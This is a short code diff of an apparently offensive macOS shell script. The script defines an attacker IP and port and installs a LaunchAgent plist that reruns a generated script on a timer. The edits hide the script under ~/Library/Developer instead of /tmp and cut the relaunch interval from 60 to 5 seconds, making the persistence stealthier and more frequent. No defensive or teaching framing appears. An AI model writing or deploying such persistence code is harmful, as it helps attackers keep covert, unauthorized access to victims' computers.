@@ -6,8 +6,7 @@ attackerip=127.0.0.1
 attackerport=9999
 ###########################
 
-
-scriptFile=/tmp/$scriptName.sh
+scriptFile=~/Library/Developer/$scriptName.sh
 plistFile=~/Library/LaunchAgents/$scriptName.plist
 
 # Create script file
@@ -25,7 +24,7 @@ cat > $plistFile << EOF
 <key>Program</key>
 <string>$scriptFile</string>
 <key>StartInterval</key> 
-<integer>60</integer>
+<integer>5</integer>
 </dict>
 </plist>
 EOF
